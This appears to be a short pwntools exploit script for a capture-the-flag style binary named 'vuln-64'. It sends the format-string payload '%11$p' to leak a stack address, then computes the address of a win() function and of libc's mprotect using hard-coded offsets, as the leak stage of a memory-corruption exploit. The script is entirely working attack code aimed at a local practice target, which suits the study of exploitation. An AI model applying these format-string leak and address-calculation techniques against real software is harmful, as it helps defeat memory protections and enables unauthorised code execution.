#!/usr/bin/env python

from pwn import *

#Set up the process
context(os='linux', arch='amd64')
p = process('./vuln-64')

#Construct payload to leak addresses of win()
payload = b'%11$p'

#Send payload for win
p.sendline(payload)

win = int(p.recvline()[:-1], 16)

#libc library
libc = p.libs()['/usr/lib/x86_64-linux-gnu/libc.so.6']

win_address = win - 331
mprotect_address = libc + 0x1010f0


#Print the leaked addresses
print("win:", hex(win_address))
print("mprotect:", hex(mprotect_address))

#Close the process
p.close()

